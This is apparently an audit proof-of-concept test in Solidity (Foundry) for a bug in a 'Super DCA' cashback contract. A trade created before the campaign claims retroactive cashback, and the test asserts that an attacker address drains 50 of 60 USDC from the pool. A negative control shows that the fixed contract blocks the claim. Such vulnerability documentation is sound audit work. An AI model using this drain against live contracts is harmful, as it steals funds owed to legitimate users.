// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    SuperDCACashback,
    SuperDCACashbackFixed,
    USDCToken,
    SuperDCATradeMock
} from "./63419-h-1-users-with-pre-campaign-trades-will-drain-cashback-funds.sol";

// Super DCA (super-dca-cashback) H-1: a trade created BEFORE the campaign start
// claims retroactive cashback for the entire pre-campaign period.
// SuperDCACashback._calculateEpochData computes
//   timeElapsed = block.timestamp - trade.startTime
// and never clamps trade.startTime up to cashbackClaim.startTime, so pre-campaign
// time is paid out as "completed epochs", draining the USDC cashback pool beyond
// entitlement.
contract SuperDCACashbackPreCampaignDrainTest is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    function test_exploit_preCampaignTradeDrainsCashback() public {
        // Trade starts 5.5 epochs before "now"; campaign started 0.5 epoch ago.
        // Warp block.timestamp to a value well above the 5.5-epoch lookback.
        vm.warp(10_000_000);

        Exploit e = new Exploit();
        e.run();

        // The attacker (owner of a pre-campaign trade) was paid for 5 completed
        // epochs (50 USDC), EVERY one of which predates the campaign start.
        assertEq(e.buggyClaimed(), 50_000_000, "attacker over-claimed retroactive cashback");

        // A correctly-clamped contract owes 0: the campaign has not completed a
        // single epoch since it started.
        assertEq(e.fixedClaimable(), 0, "entitlement under the fix");

        // All 50 USDC is theft of cashback that predates the campaign.
        assertEq(e.theftAmount(), 50_000_000, "theft magnitude (pre-campaign portion)");
        assertGt(e.buggyClaimed(), e.fixedClaimable(), "bug pays more than entitlement");

        // The stolen USDC really landed at the attacker EOA.
        USDCToken usdc = USDCToken(e.usdcAddr());
        assertEq(usdc.balanceOf(ATTACKER), 50_000_000, "attacker received the stolen USDC");

        // Pool drained from 60 -> 10 USDC; legitimate participants can no longer be
        // fully paid.
        assertEq(e.poolRemaining(), 10_000_000, "cashback pool drained below entitlement");

        // Sanity on the timeline: trade start < campaign start < claim time.
        assertLt(e.tradeStart(), e.campaignStart(), "trade predates campaign");
        assertLt(e.campaignStart(), e.claimTime(), "campaign predates claim");
    }

    // Negative control: the SAME pre-campaign trade against the FIXED contract
    // (which clamps to max(trade.startTime, cashbackClaim.startTime)) yields 0
    // completed epochs, so claimAllCashback reverts NotClaimable. The clamp
    // fully defeats the theft -- proving the harm is caused by the missing clamp,
    // not by the test setup.
    function test_control_fixedContractBlocksRetroactiveClaim() public {
        vm.warp(10_000_000);

        Exploit e = new Exploit();
        e.run();

        SuperDCACashbackFixed fixedCashback = SuperDCACashbackFixed(e.fixedAddr());
        USDCToken usdc = USDCToken(e.usdcAddr());

        // Fund the fixed contract so the ONLY possible failure reason is the
        // entitlement clamp -- never a lack of funds.
        usdc.mint(address(fixedCashback), 60_000_000);

        // The Exploit contract owns the trade NFT; prank as it.
        vm.prank(address(e));
        vm.expectRevert(SuperDCACashbackFixed.NotClaimable.selector);
        fixedCashback.claimAllCashback(1);
    }
}
